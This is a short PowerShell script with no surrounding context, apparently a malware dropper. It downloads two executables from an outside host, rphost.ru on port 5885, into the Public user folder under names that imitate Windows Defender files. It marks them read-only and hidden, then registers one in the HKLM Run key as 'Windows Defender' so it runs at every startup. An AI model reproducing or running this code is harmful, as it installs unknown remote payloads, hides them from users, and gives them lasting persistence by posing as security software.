(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/64.signed","C:\Users\Public\MSASC.exe")
Get-Item C:\Users\Public\MSASC.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
(New-Object System.Net.WebClient).DownloadFile("http://rphost.ru:5885/MS_ASC64_2.signed","C:\Users\Public\MSASCuiL.exe")
Get-Item C:\Users\Public\MSASCuiL.exe | foreach {$_.Attributes = 'ReadOnly, Hidden'}
New-ItemProperty -Path 'hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
